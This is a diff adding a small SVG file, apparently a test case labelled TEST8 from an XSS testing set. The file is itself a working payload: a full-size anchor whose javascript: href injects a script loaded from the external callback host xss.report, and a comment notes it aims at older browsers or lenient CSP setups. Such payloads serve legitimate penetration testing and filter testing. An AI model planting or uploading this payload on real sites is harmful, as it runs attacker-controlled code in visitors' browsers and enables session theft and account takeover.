@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+  <!-- 
+    javascript: href in SVG anchor.
+    Some older browsers or lenient CSP configs allow this.
+    Using xss.report callback to confirm execution.
+  -->
+  <a href="javascript:var s=document.createElement('script');s.src='https://xss.report/c/pr0xy';document.head.appendChild(s);">
+    <rect width="500" height="500" fill="#c0392b"/>
+    <text x="60" y="250" fill="white" font-size="20">TEST8: javascript: HREF</text>
+  </a>
+</svg>
